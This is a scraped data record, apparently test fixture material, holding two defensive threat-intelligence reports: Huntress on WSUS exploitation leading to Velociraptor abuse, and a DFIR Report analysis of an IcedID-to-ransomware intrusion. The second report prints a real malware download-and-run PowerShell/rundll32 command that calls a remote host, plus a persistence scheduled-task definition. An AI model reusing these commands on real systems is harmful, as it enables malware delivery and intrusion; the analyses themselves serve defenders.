Managed EDR purpose-built for your needs Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs The Huntress SOC 24/7 Security Operations Center The Huntress SOC 24/7 Security Operations Center Reviews Why businesses of all sizes trust Huntress to defend their assets Reviews Why businesses of all sizes trust Huntress to defend their assets Case Studies Learn directly from our partners how Huntress has helped them Case Studies Learn directly from our partners how Huntress has helped them Community Get in touch with the Huntress Community team Community Get in touch with the Huntress Community team Compare Huntress Bitdefender Bitdefender Blackpoint Blackpoint Breach Secure Now! Breach Secure Now! Crowdstrike Crowdstrike Datto Datto SentinelOne SentinelOne Sophos Sophos Compare All Compare All Partners Partners HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. Partner Portal Login HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. MSPs Join our partner community to deliver expert-led managed security. MSPs Join our partner community to deliver expert-led managed security. Resellers Partner program designed to grow your cybersecurity business. Resellers Partner program designed to grow your cybersecurity business. Company Company Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Our Story We're on a mission to shatter the barriers to enterprise-level security. Our Story We're on a mission to shatter the barriers to enterprise-level security. Newsroom Explore press releases, news articles, media interviews and more. Newsroom Explore press releases, news articles, media interviews and more. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Careers Ready to shake up the cybersecurity world? Join the hunt. Careers Ready to shake up the cybersecurity world? Join the hunt. Awards Awards Contact Us Contact Us Portal Login Support Contact Search Get a Demo Free Trial Portal Login Support Contact Search Search Get a Demo Free Trial Home Blog Velociraptor Misuse, Pt. I: WSUS-Up? Published: November 20, 2025 Velociraptor Misuse, Pt. I: WSUS-Up? By: Lindsey O'Donnell-Welch Harlan Carvey Acknowledgments: Special thanks to Ben Folland for his contributions to this investigation and writeup. In November, Huntress analysts detected an incident where threat actors likely exploited a recently patched remote code execution vulnerability in Windows Server Update Services (WSUS). After gaining initial access via exploitation of the flaw (CVE-2025-59287), the actors then installed Velociraptor, a legitimate, open source tool, which was used for C2 of the endpoint. Velociraptor is a digital forensics and incident response (DFIR) tool that enables teams to quickly collect and analyze artifacts from across a network, giving them a better understanding of security incidents. Threat actors have been abusing the tool in attacks, specifically to set up communications back to command-and-control (C2) servers. The Huntress Security Operations Center (SOC) first observed the misuse of Velociraptor during November 2024. However, more recently in 2025 there\u2019s been a significant uptick in the past three months of incidents involving the use of the Velociraptor to facilitate remote access into the compromised endpoint. In part one of this two-part series, we will break down a recent incident we observed where threat actors exploited WSUS before deploying Velociraptor. In part two, we will discuss the evolution of incidents over the past few months we\u2019ve seen that abuse the tool. WSUS exploitation On November 12, 2025, we observed the deployment of Velociraptor by threat actors after they had gained initial access through exploitation of a flaw in WSUS (Microsoft\u2019s centralized update distribution service for IT administrators). This deserialization issue has previously been exploited by threat actors targeting vulnerable WSUS instances exposed publicly on their default ports; as of October 23, a patch is available from Microsoft. The exploitation of WSUS is interesting when compared to previous incidents that have involved Velociraptor. Other researchers have recently publicly documented how threat actors are abusing the tool in attacks. For example, the Cisco Talos team in October found Velociraptor activity that they attributed with medium confidence to Storm-2603. While the researchers did not observe the actor\u2019s initial access in this incident, they said the vector was likely attributed to SharePoint vulnerabilities known as ToolShell, due to the impacted organization\u2019s exposure to ToolShell and the link to Storm-2603. In the incident we saw, the Windows Event Log shows the threat actor compromising WSUSService.exe before running the Windows installer (as seen via a Service Control Manager/7036 message stating Windows Installer,running ) and then installing a malicious MSI package from s3[.]wasabisys[.]com . Figure 1 illustrates the results of searching for the domain on VirusTotal. Figure 1: VirusTotal search for the domain wasabisys[.]com linked to the malicious MSI package As seen in the Windows Event Log records below, the threat actor then installed Velociraptor, which was configured to communicate with the endpoint update[.]githubtestbak[.]workers[.]dev . MsiInstaller/1040;https://s3.wasabisys.com/kiessler/v4.msi,3348,(NULL),(NULL),(NULL),(NULL), Service Control Manager/7045;Velociraptor Service,\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\" --config \"C:\\Program Files\\Velociraptor\\/client.config.yaml\" service run ,user mode service,auto start,LocalSystem Service Control Manager/7036;Velociraptor Service,running Velociraptor/1;Starting service Velociraptor MsiInstaller/11707;Product: Velociraptor -- Installation completed successfully.,(NULL),(NULL),(NULL),(NULL),(NULL), Velociraptor was installed via the following binary path: Velociraptor/1000;\"Velociraptor startup ARGV: [\"\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\"\",\"\"--config\"\",\"\"C:\\Program Files\\Velociraptor\\/client.config.yaml\"\",\"\"service\"\",\"\"run\"\"],\" During the investigation into the incident, we found that even though the first attempt to install Velociraptor succeeded, there were two more subsequent attempts to run the same command to install the open source tool from the same location. After the threat actor installed Velociraptor, we observed a number of base64-encoded PowerShell commands, which were child processes of Velociraptor.exe, such as the following: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA== Each of the observed PowerShell commands varied only in the encoded commands; the command line switches and their positions in the command line were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"C:\\Windows\\system32\\net.exe\" group \"domain computers\" /do \"C:\\Windows\\system32\\quser.exe\" \"C:\\Windows\\system32\\setspn.exe\" -Q VeeamBackupSVC/* \"C:\\Windows\\system32\\ipconfig.exe\" /al Figure 2: EDR signals showing the threat actor installing an MSI package, running Velociraptor, and performing discovery commands At this point, the threat actor\u2019s activity was contained by Huntress SOC analysts. Conclusion Velociraptor is only the latest legitimate tool that threat actors are abusing. While this is specifically for incident response, many of the tools that have previously been misused in attacks include dual-use penetration testing frameworks, such as Cobalt Strike, Mimikatz, Metasploit, and PowerSploit, as highlighted in the Huntress 2025 Cyber Threat Report . We\u2019ve seen threat actors use legitimate tools long enough to know that Velociraptor won\u2019t be the first dual-use, open-source tool that will pop up in attacks - nor will it be the last. However, by closely tracking the behavior in incidents that involve Velociraptor, we can get a better understanding of how threat actors are deploying these tools in victim environments. Huntress has seen Velociraptor in a number of other incidents over the past few months. For an additional deep view and insights into the misuse of the tool, stay tuned for part 2 of this blog series. Indicators of Compromise (IOCs) Item Description s3[.]wasabisys[.]com Domain from which MSI package was retrieved update[.]githubtestbak[.]workers[.]dev Velociraptor C2 Categories Cybersecurity Education Summarize this post ChatGPT Claude Perplexity Google AI See Huntress in action Our platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC). Book a Demo Share You Might Also Like CMMC Final Rule: What DoD Subs Need to Know The DoD's CMMC final rule is here. Learn what it means for subcontractors, the new timeline, and how to prepare for your Level 2 audit to stay competitive. Learn More #ShadyHacks with Kyle Hanslovan Learn More The Best Way to Prepare for the Worst: Incident Response Planning for Decision Makers Learn More Sign Up for Huntress Updates Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Work Email* Privacy \u2022 Terms Submit By submitting this form, you accept our Terms of Service & Privacy Policy Thank you! Your submission has been received! Oops! Something went wrong while submitting the form. Platform Huntress Managed Security Platform Managed EDR Managed EDR for macOS Managed EDR for Linux Managed ITDR Managed SIEM Managed Security Awareness Training Book a Demo Solutions Phishing Compliance Business Email Compromise Education Finance Healthcare Manufacturing State & Local Government Why Huntress? Managed Service Providers Resellers IT & Security Teams 24/7 SOC Case Studies Resources Blog Resource Center Cybersecurity 101 Upcoming Events Support Documentation About Our Company Leadership News & Press Careers Contact Us Protecting 215k+ customers like you with enterprise-grade protection. Privacy Policy Cookie Policy Terms of Use Cookie Consent \u00a9 2025 Huntress All Rights Reserved. Join the Hunt Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Email Sign Up By submitting this form, you accept our Terms of Service & Privacy Policy",
    "filtered_content": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress Huntress Acquires Inside Agent: A New Era for Identity Protection Portal Login Support Contact Search Search Products Products Platform Overview Managed EDR Get full endpoint visibility, detection, and response Managed EDR Get full endpoint visibility, detection, and response Managed ITDR Protect your Microsoft 365 identities and email environments. Managed ITDR Protect your Microsoft 365 identities and email environments. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Integrations Integrations Support Documentation Support Documentation See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Book a Demo See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Solutions Solutions Threats We Stop Phishing Phishing Business Email Compromise Business Email Compromise Ransomware Ransomware View All View All Industries We Serve Education Education Financial Services Financial Services State and Local Government State and Local Government Healthcare Healthcare Law Firms Law Firms Manufacturing Manufacturing Utilities Utilities View All View All Tailored Solutions MSPs MSPs Resellers Resellers SMBs SMBs Compliance Compliance Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Pricing Resources Resources Community Series The Product Lab Shape the next big thing in cybersecurity together. The Product Lab Shape the next big thing in cybersecurity together. Fireside Chat Real people. Real perspectives. Better conversations. Fireside Chat Real people. Real perspectives. Better conversations. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Resources Upcoming Events Upcoming Events eBooks eBooks On-Demand Webinars On-Demand Webinars Videos Videos Whitepapers Whitepapers Datasheets Datasheets Cybersecurity Education Cybersecurity 101 Cybersecurity 101 Cybersecurity Guides Cybersecurity Guides Threat Library Threat Library Real Tradecraft, Real Results Real Tradecraft, Real Results The Huntress Blog Huntress Lands on the Microsoft Marketplace Huntress Lands on the Microsoft Marketplace How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep Live Hacking Into Microsoft 365 with Kyle Hanslovan Live Hacking Into Microsoft 365 with Kyle Hanslovan Why Huntress Why Huntress Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs The Huntress SOC 24/7 Security Operations Center The Huntress SOC 24/7 Security Operations Center Reviews Why businesses of all sizes trust Huntress to defend their assets Reviews Why businesses of all sizes trust Huntress to defend their assets Case Studies Learn directly from our partners how Huntress has helped them Case Studies Learn directly from our partners how Huntress has helped them Community Get in touch with the Huntress Community team Community Get in touch with the Huntress Community team Compare Huntress Bitdefender Bitdefender Blackpoint Blackpoint Breach Secure Now! Breach Secure Now! Crowdstrike Crowdstrike Datto Datto SentinelOne SentinelOne Sophos Sophos Compare All Compare All Partners Partners HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. Partner Portal Login HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. MSPs Join our partner community to deliver expert-led managed security. MSPs Join our partner community to deliver expert-led managed security. Resellers Partner program designed to grow your cybersecurity business. Resellers Partner program designed to grow your cybersecurity business. Company Company Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Our Story We're on a mission to shatter the barriers to enterprise-level security. Our Story We're on a mission to shatter the barriers to enterprise-level security. Newsroom Explore press releases, news articles, media interviews and more. Newsroom Explore press releases, news articles, media interviews and more. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Careers Ready to shake up the cybersecurity world? Join the hunt. Careers Ready to shake up the cybersecurity world? Join the hunt. Awards Awards Contact Us Contact Us Portal Login Support Contact Search Get a Demo Free Trial Portal Login Support Contact Search Search Get a Demo Free Trial Home Blog Velociraptor Misuse, Pt. I: WSUS-Up? Published: November 20, 2025 Velociraptor Misuse, Pt. I: WSUS-Up? By: Lindsey O'Donnell-Welch Harlan Carvey Acknowledgments: Special thanks to Ben Folland for his contributions to this investigation and writeup. In November, Huntress analysts detected an incident where threat actors likely exploited a recently patched remote code execution vulnerability in Windows Server Update Services (WSUS). After gaining initial access via exploitation of the flaw (CVE-2025-59287), the actors then installed Velociraptor, a legitimate, open source tool, which was used for C2 of the endpoint. Velociraptor is a digital forensics and incident response (DFIR) tool that enables teams to quickly collect and analyze artifacts from across a network, giving them a better understanding of security incidents. Threat actors have been abusing the tool in attacks, specifically to set up communications back to command-and-control (C2) servers. The Huntress Security Operations Center (SOC) first observed the misuse of Velociraptor during November 2024. However, more recently in 2025 there\u2019s been a significant uptick in the past three months of incidents involving the use of the Velociraptor to facilitate remote access into the compromised endpoint. In part one of this two-part series, we will break down a recent incident we observed where threat actors exploited WSUS before deploying Velociraptor. In part two, we will discuss the evolution of incidents over the past few months we\u2019ve seen that abuse the tool. WSUS exploitation On November 12, 2025, we observed the deployment of Velociraptor by threat actors after they had gained initial access through exploitation of a flaw in WSUS (Microsoft\u2019s centralized update distribution service for IT administrators). This deserialization issue has previously been exploited by threat actors targeting vulnerable WSUS instances exposed publicly on their default ports; as of October 23, a patch is available from Microsoft. The exploitation of WSUS is interesting when compared to previous incidents that have involved Velociraptor. Other researchers have recently publicly documented how threat actors are abusing the tool in attacks. For example, the Cisco Talos team in October found Velociraptor activity that they attributed with medium confidence to Storm-2603. While the researchers did not observe the actor\u2019s initial access in this incident, they said the vector was likely attributed to SharePoint vulnerabilities known as ToolShell, due to the impacted organization\u2019s exposure to ToolShell and the link to Storm-2603. In the incident we saw, the Windows Event Log shows the threat actor compromising WSUSService.exe before running the Windows installer (as seen via a Service Control Manager/7036 message stating Windows Installer,running ) and then installing a malicious MSI package from s3[.]wasabisys[.]com . Figure 1 illustrates the results of searching for the domain on VirusTotal. Figure 1: VirusTotal search for the domain wasabisys[.]com linked to the malicious MSI package As seen in the Windows Event Log records below, the threat actor then installed Velociraptor, which was configured to communicate with the endpoint update[.]githubtestbak[.]workers[.]dev . MsiInstaller/1040;https://s3.wasabisys.com/kiessler/v4.msi,3348,(NULL),(NULL),(NULL),(NULL), Service Control Manager/7045;Velociraptor Service,\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\" --config \"C:\\Program Files\\Velociraptor\\/client.config.yaml\" service run ,user mode service,auto start,LocalSystem Service Control Manager/7036;Velociraptor Service,running Velociraptor/1;Starting service Velociraptor MsiInstaller/11707;Product: Velociraptor -- Installation completed successfully.,(NULL),(NULL),(NULL),(NULL),(NULL), Velociraptor was installed via the following binary path: Velociraptor/1000;\"Velociraptor startup ARGV: [\"\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\"\",\"\"--config\"\",\"\"C:\\Program Files\\Velociraptor\\/client.config.yaml\"\",\"\"service\"\",\"\"run\"\"],\" During the investigation into the incident, we found that even though the first attempt to install Velociraptor succeeded, there were two more subsequent attempts to run the same command to install the open source tool from the same location. After the threat actor installed Velociraptor, we observed a number of base64-encoded PowerShell commands, which were child processes of Velociraptor.exe, such as the following: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA== Each of the observed PowerShell commands varied only in the encoded commands; the command line switches and their positions in the command line were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"C:\\Windows\\system32\\net.exe\" group \"domain computers\" /do \"C:\\Windows\\system32\\quser.exe\" \"C:\\Windows\\system32\\setspn.exe\" -Q VeeamBackupSVC/* \"C:\\Windows\\system32\\ipconfig.exe\" /al Figure 2: EDR signals showing the threat actor installing an MSI package, running Velociraptor, and performing discovery commands At this point, the threat actor\u2019s activity was contained by Huntress SOC analysts. Conclusion Velociraptor is only the latest legitimate tool that threat actors are abusing. While this is specifically for incident response, many of the tools that have previously been misused in attacks include dual-use penetration testing frameworks, such as Cobalt Strike, Mimikatz, Metasploit, and PowerSploit, as highlighted in the Huntress 2025 Cyber Threat Report . We\u2019ve seen threat actors use legitimate tools long enough to know that Velociraptor won\u2019t be the first dual-use, open-source tool that will pop up in attacks - nor will it be the last. However, by closely tracking the behavior in incidents that involve Velociraptor, we can get a better understanding of how threat actors are deploying these tools in victim environments. Huntress has seen Velociraptor in a number of other incidents over the past few months. For an additional deep view and insights into the misuse of the tool, stay tuned for part 2 of this blog series. Indicators of Compromise (IOCs) Item Description s3[.]wasabisys[.]com Domain from which MSI package was retrieved update[.]githubtestbak[.]workers[.]dev Velociraptor C2 Categories Cybersecurity Education Summarize this post ChatGPT Claude Perplexity Google AI See Huntress in action Our platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC). Book a Demo Share You Might Also Like CMMC Final Rule: What DoD Subs Need to Know The DoD's CMMC final rule is here. Learn what it means for subcontractors, the new timeline, and how to prepare for your Level 2 audit to stay competitive. Learn More #ShadyHacks with Kyle Hanslovan Learn More The Best Way to Prepare for the Worst: Incident Response Planning for Decision Makers Learn More Sign Up for Huntress Updates Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Work Email* Privacy \u2022 Terms Submit By submitting this form, you accept our Terms of Service & Privacy Policy Thank you! Your submission has been received! Oops! Something went wrong while submitting the form. Platform Huntress Managed Security Platform Managed EDR Managed EDR for macOS Managed EDR for Linux Managed ITDR Managed SIEM Managed Security Awareness Training Book a Demo Solutions Phishing Compliance Business Email Compromise Education Finance Healthcare Manufacturing State & Local Government Why Huntress? Managed Service Providers Resellers IT & Security Teams 24/7 SOC Case Studies Resources Blog Resource Center Cybersecurity 101 Upcoming Events Support Documentation About Our Company Leadership News & Press Careers Contact Us Protecting 215k+ customers like you with enterprise-grade protection. Privacy Policy Cookie Policy Terms of Use Cookie Consent \u00a9 2025 Huntress All Rights Reserved. Join the Hunt Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Email Sign Up By submitting this form, you accept our Terms of Service & Privacy Policy",
    "expected_count": 1
  },
  {
    "url": "http://127.0.0.1:8001/articles/762",
    "title": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report",
    "content": "From OneNote to RansomNote: An Ice Cold Intrusion \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind Exfiltrate Data icedid nokoyawa ransomware From OneNote to RansomNote: An Ice Cold Intrusion April 1, 2024 Key Takeaways In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote files. In this case, we observed a threat actor deliver IcedID using this method. After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days. The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server. The threat actor used FileZilla to exfiltrate data from the network before deploying Nokoyawa ransomware . An audio version of this report can be found on Spotify , Apple , YouTube , Audible , & Amazon . Please consider leaving feedback on this report here . Services We provide a range of services, one of which is our Threat Feed, specializing in monitoring Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, Viper, Mythic, Havoc, Meterpreter, and more. For example, the Cobalt Strike server in this case was detected weeks before this intrusion started. Another service we provide is Private Threat Briefs, which encompasses over 25 private reports annually. These reports follow a format similar to our public reports but are more concise in nature. In contrast to our public reports, these briefs are typically released shortly after an intrusion, sometimes even while the intrusion is still ongoing. Our comprehensive \u201cAll Intel\u201d service includes the Threat Feed, Private Threat Briefs, exploit events, long-term infrastructure tracking, clustering, Cobalt Strike configurations, C2 domains, and a curated collection of intelligence, which includes non-public case data. Our Private Sigma Ruleset is exclusively curated using insights derived from Private Threat Briefs and internal cases, focusing on Sigma rules. As of January 2024, it encompasses approximately 100 Sigma rules, created from the knowledge of 40+ distinct cases. Each rule is mapped to ATT&CK and accompanied by a test example. Contact us for a demo or free trial today! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary This intrusion started in late February of 2023 and lasted through late March of 2023. The threat actor initially gained access through a phishing campaign, in which they distributed emails containing malicious OneNote attachments. During this period, OneNote files had surged in popularity among initial access brokers. This rise was primarily due to their capability to circumvent email attachment blocking rules and evade detection by existing security mechanisms. Upon opening the malicious OneNote file and engaging with it, the file triggered the execution of a cmd file. This, in turn, launched PowerShell to facilitate the download of an IcedID DLL from a remote server. To evade detection, this DLL was disguised using various image file extensions. Following the execution of the downloaded DLL, a scheduled task was established to maintain persistence within the system. Notably, unlike prior IcedID infections, no discovery actions were observed at this time. For the next 21 days, activity was limited to command and control beaconing with no other actions detected. On day 22, the standard IcedID discovery, using Microsoft tools like: net, nltest, chcp, and systeminfo, was observed. Beyond this, no further activity was noted. On day 33 of the intrusion, the IcedID malware launched several Cobalt Strike beacons. These beacons, once active on the beachhead host, injected into numerous processes and initiated an Active Directory discovery operation. This operation used a batch script to execute a series of AdFind commands. Next, a PowerShell script was deployed to install AnyDesk. Following the installation, another batch script ran to relay the newly generated AnyDesk ID back to the threat actor. The threat actor then connected to the host using AnyDesk and began browsing files. The account they were logged in as had elevated privileges, since the original user, who inadvertently activated the malware, was a member of the domain administrators group. Leveraging this access, they accessed LSASS on the host and proceeded with additional reconnaissance activities. These actions encompassed both command line queries, such as net, whoami, and route, as well as GUI based tools through the AnyDesk connection, including the use of Task Manager and the deployment of SoftPerfect Network Scanner (aka NetScan). After getting a list of hosts, the threat actor created a batch file to run nslookup for all the identified hosts. While that was running, the threat actor browsed file shares, looking at various documents including password related documents. The threat actor then created a second batch script to run nslookup, this time targeting Windows servers specifically. Shortly after running this, the threat actor initiated their first lateral movement action, using RDP to connect to a backup server from their beachhead host. On the backup server, they used Internet Explorer to download a Cobalt Strike beacon and then they executed it. Utilizing this beacon, they proceeded to deploy and execute an AnyDesk installer package, identical to the one observed on the initial compromised host. Next, they pivoted to a file server and performed the same actions. On the file server, they continued to review documents, including insurance related files. The threat actor then opened Internet Explorer on the file server and proceeded to download FileZilla. Utilizing the FileZilla client, they established a SFTP connection to a remote server, initiating the data exfiltration process. This marked the beginning of a prolonged data exfiltration operation that spanned several hours. Apart from the ongoing data transfers, activity significantly decreased until it resumed the following day. Approximately 18 hours after the initiation of the data exfiltration process, the threat actor deemed the activity complete and progressed to the next phase of their attack. They conducted another network scan utilizing NetScan. Roughly two and a half hours post-scan, they initiated the preparation for a ransomware delivery. Leveraging their AnyDesk connection on the file server, they reviewed both the Task Manager and the Local Group Policy Manager, before dropping a ransomware file on the host. Following this, they executed a batch script designed to launch the ransomware. Following the execution of ransomware on the file server, the threat actor re-established their connection to the backup server, conducting similar checks via Task Manager and Local Group Policy Manager before dropping the ransomware file. Next, they introduced and executed IOBit\u2019s Unlocker utility, a move likely aimed at circumventing file locks imposed by the backup software. After using this tool, they followed the same batch script execution on this server as previously observed. After execution, they dropped and ran ProcessHacker and then proceeded to open the batch file in notepad++ before re-running the script and ransomware. Approximately two hours after the initiation of the ransomware on the file server, the threat actor revisited the system through their AnyDesk connection. In this return visit, they uninstalled FileZilla, signaling a move to cover their tracks. Next, they re-executed the ransomware on the host, and then opened the ransom note on the server\u2019s desktop, verifying their objective was complete. Following this action, no further activities were detected from the threat actor regarding the ransomware deployment, indicating a strategic decision to limit the attack\u2019s scope to these two critical servers rather than extending it across the entire network. From initial access to ransomware execution, we observed a Time to Ransomware (TTR) of 812 hours, just over 34 calendar days. One interesting thing to note about the command and control domain for Cobalt Strike is it was seized by Microsoft, Fortra and Health-ISAC a few weeks after this intrusion. On April 6, 2023, the command and control domain changed DNS to Microsoft with a domain registration name of Digital Crimes Unit. Please consider leaving feedback on this report here . Analysts Analysis and reporting completed by @iiamaleks , @IrishD34TH , and @Miixxedup Initial Access A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified \u201csecure message.\u201d The campaign was documented in open-source threat intelligence by pr0xylife on their GitHub repository . The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload. According to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them. The OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named \u201cO p e n.cmd\u201d was hidden behind a large button marked \u201cOpen\u201d in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button. Execution The initial execution through the OneNote lure required the person who received the email attachment to open the OneNote file. After clicking through the warning prompt, the O p e n.cmd file executed PowerShell to download an IcedID DLL named as if it was a JPG file, then used rundll32 to execute the DLL, which immediately connected to command and control servers, checked in and started beaconing over unencrypted HTTP, triggering an Emerging Threats Open rule: ET MALWARE Win32/IcedID Request Cookie. The earliest indicators that something suspicious occurred were the Sysmon events: File Created (Event ID 11) and File Stream Created (Event ID 15) that showed a .cmd file with the Mark of the Web was created by OneNote: The metadata of the O p e n.cmd batch file can be found on VirusTotal , and the contents are shown below. It is a very simple batch script that uses basic obfuscation, but yet presents some easy detection opportunities in its behavior: After de-obfuscating the batch file (or by observing the child processes created during dynamic analysis), the purpose of the script becomes clear. powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\\programdata\\COIm.jpg It uses PowerShell to download a payload file from a URL. The remote server request makes it look like it could be a GIF image that is being downloaded. The file is dropped to C:\\programdata\\ using a filename that looks like a JPEG image. The real filetype is actually a DLL: The file was then run using rundll32. rundll32 c:\\programdata\\COIm.jpg,init Somewhat surprisingly, more than a month after initial access in the intrusion, after the threat actor had started interacting with the compromised machine using AnyDesk, they opened the OneNote file and double-clicked the Open button to launch IcedID again. We are unsure of the motivation of this action, but this represented another chance for defenders to respond if detections were in place. Execution of Cobalt Strike Beacon On the 33rd day of the intrusion, the IcedID malware was observed dropping several files. These files were Cobalt Strike beacons, which were then executed via the IcedID malware. IcedID was running in rundll32.exe, which launched a DLL version of Cobalt Strike beacon from the user\u2019s AppData\\Local\\Temp directory using regsvr32.exe. The IcedID rundll32.exe process also launched an EXE version of a beacon named \u201cFuna2.exe\u201d from the same Temp directory. During lateral movement activity, the threat actors deployed the same executable Cobalt Strike beacon as seen on the beachhead host. This time, they used the name csrss.exe and executed these using the RDP session. The files were downloaded onto the lateral hosts using Internet Explorer, then executed by clicking directly from the Internet Explorer download prompt or by double-clicking in File Explorer window. Throughout the later stages of the intrusion the Cobalt Strike beacons used various named pipes. One of the many effective ways to detect Cobalt Strike beacon in this intrusion was through the named pipes it created, which used the default naming patterns. These pipe creation events were observed with Sysmon. A DLL version of the Cobalt Strike beacon was dropped on the beachhead host in the Local AppData Temp directory and executed with RegSvr32.exe, but that process did not create any named pipes. The default Cobalt Strike pipes are (the \u201c*\u201d symbolize the prefix/suffix): \\postex_* \\postex_ssh_* \\status_* \\msagent_* \\MSSE-* \\*-server More strategies for detecting Cobalt Strike can be found in Cobalt Strike, a Defender\u2019s Guide part 1 and part 2 . Persistence During the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it: Cadiak.dll : IcedID first stage. license.dat : Encoded version of the second stage, which gets loaded into memory by the first stage. A scheduled task was created that contained instructions for executing the IcedID DLL and the location of the license.dat file. This is a very common method that IcedID uses for persistence. <?xml version=\"1.0\" encoding=\"UTF-16\"?> <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"> <RegistrationInfo> <URI>\\azigci_{C747FFDF-F0E2-113B-8DCA-0ECA4EBB92A2}</URI> </RegistrationInfo> <Triggers> <LogonTrigger id=\"LogonTrigger\"> <Enabled>true</Enabled> <UserId>[REDACTED]</UserId> </LogonTrigger> </Triggers> <Principals> <Principal id=\"Author\"> <RunLevel>HighestAvailable</RunLevel> <UserId>[REDACTED]</UserId> <LogonType>InteractiveToken</LogonType> </Principal> </Principals> <Settings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>false</AllowHardTerminate> <StartWhenAvailable>true</StartWhenAvailable> <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>true</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <RunOnlyIfIdle>false</RunOnlyIfIdle> <WakeToRun>false</WakeToRun> <ExecutionTimeLimit>PT0S</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Actions Context=\"Author\"> <Exec> <Command>rundll32.exe</Command> <Arguments>\"C:\\Users\\[REDACTED]\\AppData\\Roaming\\[REDACTED]\\Cadiak.dll\",init 